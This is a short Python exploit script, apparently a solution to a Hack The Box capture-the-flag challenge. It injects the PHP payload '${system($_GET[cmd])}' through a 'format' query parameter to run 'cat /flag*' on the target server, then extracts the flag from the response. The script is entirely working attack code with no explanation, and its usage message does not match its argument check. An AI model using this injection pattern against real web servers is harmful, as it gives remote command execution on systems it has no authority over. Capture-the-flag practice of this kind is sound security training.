import sys
import requests
import re

if len(sys.argv) != 2:
    print("Usage python3 exploit.py <ip> <port>")
    sys.exit(1)

host = sys.argv[1]
url = f"http://{host}/"

parameter1 = "${system($_GET[cmd])}"

parameters = {"format": parameter1, "cmd": f"cat /flag*"}
r_flag = requests.get(url, params=parameters)
flag = re.search(r"HTB\{.*?\}", r_flag.text)

if flag:
    print(flag.group(0))
